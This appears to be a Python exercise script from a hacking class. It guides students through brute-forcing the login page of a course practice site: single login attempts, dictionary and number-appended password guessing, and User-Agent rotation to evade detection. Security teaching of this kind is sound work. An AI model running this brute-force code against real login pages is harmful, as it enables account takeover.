import requests
import random
import time

# You might need to install the requests library:
# pip install requests

# --- Configuration ---
# This is the URL of the live target website for the Fullwood Hackademy 2025 session.
BASE_URL = "https://fullwoodhackademy2025.pro/"
LOGIN_URL = BASE_URL + "login.php" 


## -- STEP 1: RECONNAISSANCE --
##
## This step is done manually!
## Open your browser, go to https://fullwoodhackademy2025.pro/ and find Infomration about "target users".
## Choose a target and guess their username (e.g., their first name).
## You will use that username in the steps below.


## -- STEP 2: Make a simple GET request to the page --
##
## Uncomment the code below to complete Step 2.
##
# print("--- [Step 2: GET Request] ---")
# print(f"Fetching content from {LOGIN_URL}")
# try:
#     response = requests.get(LOGIN_URL, verify=False)
#     print("Status Code:", response.status_code)
#     if response.status_code == 200:
#         print("Successfully connected to the live site.")
#         print("Page Content (first 300 chars):")
#         print(response.text[:300])
#     else:
#         print(f"Error: Could not connect properly. Status code: {response.status_code}")
# except requests.exceptions.RequestException as e:
#     print(f"An error occurred: {e}")


## -- STEP 3: Make a single POST request --
## 
# # !!! TASK: Change variable 'username_you_found' from 'SomeUser' to the username you chose in Step 1 !!!
# # !!! TASK: Change variable password_to_try from 'testpassword' to any password1 !!!
## Uncomment the code below to complete Step 3.
##
# print("\n--- [Step 3: POST Request] ---")


# username_you_found = 'ella@example.com'
# password_to_try = 'testpassword'


# login_data = {
#     'email': username_you_found,
#     'password': password_to_try
# }
# print(f"Attempting to log in as {login_data['email']} with password '{login_data['password']}'...")
# try:
#     response = requests.post(LOGIN_URL, data=login_data, verify=False)
#     print("Response from server:")
#     print(response.text)
# except requests.exceptions.RequestException as e:
#     print(f"An error occurred: {e}")


## -- STEP 4: Brute-force using a password file --
##
## Uncomment the code below to complete Step 4.
##
# print("\n--- [Step 4: Brute-Force with File] ---")
# password_file = "data/mockyou.txt"

# # !!! TASK: Change 'SomeUser' to the username you chose in Step 1 !!!
# username_to_try = "ella@example.com"

# success = False
# print(f"Starting brute-force on user '{username_to_try}' with file: {password_file}")
# try:
#     with open(password_file, 'r') as f:
#         for password in f:
#             password = password.strip()
#             if not password: continue # Skip empty lines

#             login_data = {'email': username_to_try, 'password': password}
#             print(f"Trying password: {password}")
#             response = requests.post(LOGIN_URL, data=login_data, verify=False)
#             # print(response.status_code)
#             if "Welcome" in response.text or "Dashboard" in response.text or response.status_code!=401:
#                 print(f"\n>>> Success! Login successful for {username_to_try} with password '{password}'")
#                 success = True
#                 break
#             # time.sleep(0.5) # Be polite to the live server!

# except FileNotFoundError:
#     print(f"Error: The password file '{password_file}' was not found.")
# except requests.exceptions.RequestException as e:
#     print(f"An error occurred during the attack: {e}")

# if not success:
#     print(f"\nFile-based brute-force failed. No correct password found in the list.")


## -- STEP 5: Appending an integer to every password from the file --
##
## Uncomment the code below to complete Step 5.
##
# print("\n--- [Step 5: Enhanced Brute-Force] ---")
# password_file = "data\mockyou.txt"

# # !!! TASK: Change 'SomeUser' to the username you chose in Step 1 !!!
# username_to_try = "ella@example.com"

# success = False
# print(f"Starting enhanced brute-force on '{username_to_try}' (file + appending numbers)...")
# try:
#     with open(password_file, 'r') as f:
#         for password in f:
#             password = password.strip()
#             if not password: continue

#             for i in range(0, 20):  # range of numbers to append
#                 current_guess = password + str(i)
#                 print(f"Trying: {current_guess}", end='\r')
#                 login_data = {'email': username_to_try, 'password': current_guess}
#                 response = requests.post(LOGIN_URL, data=login_data, verify=False)
#                 if "Welcome" in response.text or "Dashboard" in response.text:
#                     print("\n" + "="*40)
#                     print(f">>> Success! Found password for {username_to_try}: '{current_guess}'")
#                     print("="*40)
#                     success = True
#                     break
#             if success:
#                 break
#             time.sleep(0.1) # A small pause between base passwords

# except FileNotFoundError:
#     print(f"Error: The password file '{password_file}' was not found.")
# except requests.exceptions.RequestException as e:
#     print(f"An error occurred during the attack: {e}")

# if not success:
#     print("\nEnhanced brute-force failed. The password must be even more complex!")


## -- STEP 6: Using random User-Agent strings --
##
## Uncomment the code below to complete Step 6.
##
# from user_agents import USER_AGENTS
#
# print("\n--- [Step 6: Adding User-Agents] ---")
#
# # Use the password you discovered in the previous step!
# discovered_password = "password123"
# username_to_try = "SomeUser"
#
# login_data = {'email': username_to_try, 'password': discovered_password}
#
# print("Testing final login with User-Agent rotation...")
# for i in range(5):
#     headers = {'User-Agent': random.choice(USER_AGENTS)}
#     print(f"Attempting login with User-Agent: {headers['User-Agent'][:50]}...")
#     try:
#         response = requests.post(LOGIN_URL, data=login_data, headers=headers, verify=False)
#         if "Welcome" in response.text or "Dashboard" in response.text:
#             print("   ...Success!")
#         else:
#             print("   ...Failed? Check your password and username.")
#         time.sleep(1) # Wait 1 second between requests
#     except requests.exceptions.RequestException as e:
#         print(f"An error occurred: {e}")
#         break

print("\n Step complete. Feel free to experiment further!")